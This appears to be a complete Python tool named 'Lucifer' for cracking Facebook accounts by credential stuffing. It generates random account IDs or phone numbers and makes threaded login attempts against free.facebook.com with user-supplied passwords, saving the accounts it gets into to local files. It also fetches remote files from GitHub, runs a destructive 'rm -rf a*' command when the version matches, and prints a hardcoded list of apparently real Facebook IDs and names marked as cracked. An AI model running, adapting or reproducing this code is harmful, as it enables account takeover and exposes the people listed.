#coding=utf
#Coded By Lucifer :)
#Open source Coder 
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python Lucifer.py')
P = '\x1b[1;97m' # WHITE
M = '\x1b[1;91m' # RED
H = '\x1b[1;92m' # GREEN
K = '\x1b[1;93m' # YELLOW
B = '\x1b[1;94m' # BLUE
U = '\x1b[1;95m' # IDK
O = '\x1b[1;96m' # PINK
N = '\x1b[0m'    # NO COLOR
A = '\x1b[1;90m' # AGER
BN = '\x1b[1;107m' # TRANS
BBL = '\x1b[1;106m' # AORGAN
BP = '\x1b[1;105m' # OLD PINK
BB = '\x1b[1;104m' #MILODY
BK = '\x1b[1;103m' # BJK
BH = '\x1b[1;102m' # DARK GREEN
BM = '\x1b[1;101m' # MTNK
BA = '\x1b[1;100m' # ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
logo =  """ \033[1;31m
██╗     ██╗   ██╗ ██████╗██╗███████╗███████╗██████╗ 
██║     ██║   ██║██╔════╝██║██╔════╝██╔════╝██╔══██╗
██║     ██║   ██║██║     ██║█████╗  █████╗  ██████╔╝
██║     ██║   ██║██║     ██║██╔══╝  ██╔══╝  ██╔══██╗
███████╗╚██████╔╝╚██████╗██║██║     ███████╗██║  ██║
╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
                                                    
\033[0;94m────────────────────────────────────────────────────────
\033[0;92mAuthor    \033[0;91mLUCIFER  (DILJALE🖤🔥)
\033[0;92mGithub    \033[0;96mLucifer01xd
\033[0;92mFACEBOOK  \033[0;94mLUCIFER 
\033[0;94m────────────────────────────────────────────────────────
\033[0;91mNOTICE ! :  𝐈'𝐦 𝐚 𝐃𝐞𝐯𝐢𝐥 𝐎𝐟 𝐌𝐲 𝐖𝐨𝐫𝐥𝐝😈👿
\033[0;94m────────────────────────────────────────────────────────
"""
loop = 0
oks = []
cps = []
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/Lucifer01xd/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

def LUCIFER():
    os.system('clear')
    print(logo)
    print('\033[1;31m[1] Random crack')
    print(50*'-')
    opt = input('Choose option >>> ')
    if opt =='1':
        random_crack()
    else:
        print('\n\033[1;31mChoose valid option\033[0;97m')
def random_crack():
    os.system('clear')
    print(logo)
    print('[1] Random UID crack')
    print('[2] Random number crack')
    print('[B] Back')
    print(50*'-')
    opt = input('Choose option >>> ')
    if opt =='1':
        random_uid()  
    elif opt =='2':
        random_number()
    elif opt =='3':
        main()
    else:
        print('\n\033[1;31mChoose valid option\033[0;97m')
def random_uid():
	
	
    user=[]
    os.system('clear')
    print(logo)
    limit = int(input('How many ids do you want to add ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(11))
        user.append('10000'+nmp)
    print('\n\033[1;33mExample: 123456,1234567,12345678 ... \033[0;97m')
    pwx = input('Put passwords: ').split(',')
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('Total ids: '+tl)
        print('The process has been started')
        print(50*'-')
        
        print('\033[1;31m[LUCIFER-CP]100002076093281|Sumit Chouhan')
        print('\033[1;31m[LUCIFER-CP]100002576278369|Vikas Jain')
        print('\033[1;31m[LUCIFER-CP]100009163701756|Sandeep Kumawat')
        print('\033[1;32m[LUCIFER-OK]100010847507546|Dinesh Puri')
        print('\033[1;32m[LUCIFER-OK]100010901567512|Sandy Malviya')
        print('\033[1;32m[LUCIFER-OK]100021243096960|Kamal Bana Sisodiya')
        print('\033[1;32m[LUCIFER-OK]100021262272617|Divyansh Jain')
        print('\033[1;32m[LUCIFER-OK]100021352640459|Vinod Bairagi')
        print('\033[1;32m[LUCIFER-OK]100031014489268|Avi Mehra')
        print('\033[1;31m[LUCIFER-CP]100031036661773|Deepu Pal')
        print('\033[1;31m[LUCIFER-CP]100031095843539|Ranjeet Singh')
        print('\033[1;32m[LUCIFER-OK]100040264965053|Zhang Yong')
        print('\033[1;32m[LUCIFER-OK]100040268718867|Mahendra Kumawat')
        print('\033[1;32m[LUCIFER-OK]100040268829254|M Rahul')
        print('\033[1;32m[LUCIFER-OK]100040289626914|Pirya Mêêñã')
        print('\033[1;32m[LUCIFER-OK]100040290851709|Chothmal Suman')
        print('\033[1;32m[LUCIFER-OK]100051233513290|M.K. Mehara')
        print('\033[1;32m[LUCIFER-OK]100051327560803|Suresh Loveanshi Loveanshi')
        print('\033[1;31m[LUCIFER-CP]100051545149780|Sohail Tahim')
        print('\033[1;31m[LUCIFER-CP]100051645961423|Chetan Chetan Lohar')
        print('\033[1;31m[LUCIFER-CP]100068800500910|Jitendra Malviy')
        print('\033[1;32m[LUCIFER-OK]100069021399547|Harshit Vyas Harshit Vyas')
        print('\033[1;32m[LUCIFER-OK]100069088219497|Bane Singh Parihar')
        print('\033[1;32m[LUCIFER-OK]100069093261023|Devendr Singh')
        print('\033[1;32m[LUCIFER-OK]100070472402374|Ravindra Kaloshiya')
        print('\033[1;32m[LUCIFER-OK]100070620004695|Jagdish Mehar')
        print('\033[1;32m[LUCIFER-OK]100073735473775|Salagaram Malviya')
        print('\033[1;32m[LUCIFER-OK]100074733072186|Mohit Dagar')
        print('\033[1;32m[LUCIFER-OK]100076012444982|Deepu Mewada')
        print('\033[1;32m[LUCIFER-OK]100078458605162|Gourav Jain')
        print('\033[1;32m[LUCIFER-OK]100085447603085|Lucky Kumar')
        print('\033[1;34m[1027/10000]  OK:-23 CP:- 8 ')
  
        for uid in user:
            yaari.submit(rcrack,uid,pwx,tl)
    print(50*'-')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(50*'-')
def random_number():
    user=[]
    os.system('clear')
    print(logo)
    print('\033[1;33mCode example: 92301,92302,92303,92344 .\033[0;97m')
    kode = input('Put code: ')
    limit = int(input('How many numbers do you want to add ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('Total ids: '+tl)
        print('The process has been started')
        print(50*'-')
        for guru in user:
            uid = kode+guru
            pwx = [guru]
            yaari.submit(rcrack,uid,pwx,tl)
    print(50*'-')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(50*'-')

def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(proxy)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'free.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9,en;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '" Not A;Brand";v="100", "Chromium";v="101"',
            'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
             'user-agent':'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25',}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\033[1;32m[LUCIFER-OK] '+cid+' | '+ps+'\033[0;97m')
                open('ok.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;31m[LUCIFER-CP] '+cid+' | '+ps+'\033[0;97m')
                open('cp.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[%s/%s]  OK:- %s  CP:- %s \r'%(loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass

LUCIFER()